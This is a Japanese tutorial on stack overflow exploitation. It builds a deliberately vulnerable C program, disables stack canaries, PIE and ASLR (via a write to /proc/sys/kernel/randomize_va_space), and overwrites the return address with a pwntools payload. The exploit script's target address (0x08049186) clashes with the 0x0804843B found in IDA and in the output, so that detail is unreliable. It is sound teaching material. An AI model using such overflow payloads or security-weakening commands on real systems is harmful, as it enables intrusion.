  # スタックオーバーフローの原理

## 紹介

スタックオーバーフロー(stack overflow)とは、プログラムがスタック上のある変数に、その変数自体に確保されたバイト数を超えるバイト数を書き込み、その結果、隣接するスタック上の変数の値が書き換えられてしまうことを指します。この種の問題は特定のバッファオーバーフロー脆弱性であり、類似のものにヒープオーバーフローや bss セグメントオーバーフローなどがあります。スタックオーバーフロー脆弱性は、軽ければプログラムをクラッシュさせ、重ければ攻撃者にプログラムの実行フローを制御させます。また、スタックオーバーフローが発生する基本的な前提は次のとおりであることも容易に分かります。

- プログラムがスタックにデータを書き込むこと。
- 書き込むデータのサイズが適切に制御されていないこと。

## 基本的な例

最も典型的なスタックオーバーフローの利用は、プログラムの戻りアドレスを攻撃者が制御するアドレスで上書きすることです。**もちろん、そのアドレスが属するセグメントに実行権限があることを確認する必要があります。** 簡単な例を挙げます。

```C
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```

このプログラムの主な目的は、文字列を読み取って出力することです。**私たちは、プログラムに success 関数を実行させる制御を得たいと考えます。**

次のコマンドでコンパイルします。

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
```

gets 自体が危険な関数であることが分かります。入力文字列の長さを一切チェックせず、改行で入力が終わったかどうかを判断するため、スタックオーバーフローを容易に引き起こせます。

> 歴史上、最初のワームである **Morris ワーム**は、この gets という危険な関数を使ってスタックオーバーフローを実現しました。

gcc のコンパイルコマンドで、`-m32` は 32 ビットのプログラムを生成することを指し、`-fno-stack-protector` はスタック保護を有効にしない、つまり canary を生成しないことを指します。
また、スタックオーバーフローの基本的な利用方法をより分かりやすく紹介するため、ここでは PIE(Position Independent Executable)も無効にして、ロードのベースアドレスがばらばらにならないようにする必要があります。gcc のバージョンによって PIE のデフォルト設定は異なります。`gcc -v` コマンドで gcc のデフォルトのスイッチの状況を確認できます。`--enable-default-pie` パラメータが含まれていれば PIE がデフォルトで有効であることを意味し、コンパイルコマンドに `-no-pie` パラメータを追加する必要があります。

コンパイルに成功したら、checksec ツールでコンパイルしたファイルを確認できます。

```
➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
コンパイル時の PIE 保護に関連して、Linux プラットフォームにはアドレス空間配置のランダム化(ASLR)の仕組みもあります。簡単に言うと、実行ファイルで PIE 保護が有効でも、システムで ASLR が有効でなければベースアドレスは実際にはランダム化されず、プログラムは実行時に固定のベースアドレスにロードされます(ただし No PIE のときとはベースアドレスが異なります)。`/proc/sys/kernel/randomize_va_space` を変更することで ASLR の有効・無効を制御でき、具体的な選択肢は次のとおりです。

- 0: ASLR を無効にします。ランダム化されません。スタック、ヒープ、.so のベースアドレスは毎回同じです。
- 1: 通常の ASLR。スタックのベースアドレス、mmap のベースアドレス、.so のロードベースアドレスがランダム化されますが、ヒープのベースアドレスはランダム化されません。
- 2: 強化された ASLR。1 に加えて、ヒープのベースアドレスのランダム化が追加されます。

`echo 0 > /proc/sys/kernel/randomize_va_space` で Linux システムの ASLR を無効にできます。同様に、対応するパラメータを設定することもできます。

以降のエクスプロイトの複雑さを下げるため、ここでは ASLR を無効にし、コンパイル時に PIE も無効にします。もちろん、読者が ASLR と PIE のスイッチのさまざまな組み合わせを試し、IDA とそのデバッグ機能でプログラムのアドレスの変化を観察してみるのもよいでしょう(ASLR が無効で PIE が有効の場合でも攻撃は成功します)。

スタックオーバーフローがあることと PIE が無効であることを確認したら、IDA でバイナリを逆コンパイルし、vulnerable 関数を見ます。次のようになっています。

```C
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

この文字列は ebp からの距離が 0x14 なので、対応するスタックの構造は次のようになります。

```text
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

また、IDA から success のアドレスを得られます。そのアドレスは 0x0804843B です。

```asm
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

そこで、読み込ませる文字列が次のようなものだとします。

```
0x14*'a'+'bbbb'+success_addr
```

gets は改行まで読み込んで終わるので、すべての文字列をそのまま読み込ませることができ、saved ebp を bbbb で、retaddr を success_addr で上書きできます。つまりこのときのスタックの構造は次のようになります。

```text
                                           +-----------------+
                                           |    0x0804843B   |
                                           +-----------------+
                                           |       bbbb      |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

ただし、コンピュータのメモリでは、値はすべてバイト単位で格納されることに注意が必要です。通常はリトルエンディアンで格納されるので、0x0804843B はメモリ上では次の形になります。

```text
\x3b\x84\x04\x08
```

しかし、これらの文字をターミナルにそのまま入力することはできません。ターミナルで入力すると、\ や x なども1文字として扱われてしまいます。そのため、\x3b を1つの文字として入力する方法を考える必要があります。そこで pwntools の出番です(インストール方法や基本的な使い方は各自 github で調べてください)。pwntools を使ったコードは次のとおりです。

```python
##coding=utf8
from pwn import *
## プログラムとやり取りするオブジェクトを作る
sh = process('./stack_example')
success_addr = 0x08049186
## payload を組み立てる
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## プログラムに文字列を送る
sh.sendline(payload)
## コードによるやり取りを手動のやり取りに切り替える
sh.interactive()
```

コードを実行すると、次の結果が得られます。

```shell
➜  stack-example python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```

確かに success 関数が実行されていることが分かります。

## 小まとめ

上の例は、実はスタックオーバーフローにおける比較的重要な手順をいくつか示しています。

### 危険な関数を探す

危険な関数を探すことで、プログラムにスタックオーバーフローの可能性があるか、あるならその位置はどこかを素早く特定できます。一般的な危険な関数は次のとおりです。

-   入力
    -   gets、1行を直接読み取り、'\x00' を無視します
    -   scanf
    -   vscanf
-   出力
    -   sprintf
-   文字列
    -   strcpy、文字列のコピー。'\x00' に達すると停止します
    -   strcat、文字列の連結。'\x00' に達すると停止します
    -   bcopy

### パディング長の決定

この部分では主に、**操作したいアドレスと、上書きしたいアドレスとの距離**を計算します。一般的な方法は、IDA を開き、与えられたアドレスからオフセットを計算することです。変数のインデックスの形式には、一般に次のようなものがあります。

- スタックのベースアドレスからの相対インデックス。EBP からの相対オフセットを見れば直接得られます
- スタックトップポインタからの相対インデックス。一般にはデバッグが必要ですが、結局は最初のタイプに変換されます。
- 直接アドレスのインデックス。アドレスを直接与えられているのと同じです。

一般に、次のような上書きの需要があります。

- **関数の戻りアドレスの上書き**。この場合は EBP を見るだけで済みます。
- **スタック上のある変数の内容の上書き**。この場合はより細かい計算が必要です。
- **bss セグメントのある変数の内容の上書き**。
- 実際の実行状況に応じて、特定の変数やアドレスの内容を上書きする。

あるアドレスを上書きしたいのは、アドレスを上書きする方法で**プログラムの実行フローを直接または間接的に制御**したいからです。

## 参考文献

[stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

http://bobao.360.cn/learning/detail/3694.html

https://www.cnblogs.com/rec0rd/p/7646857.html
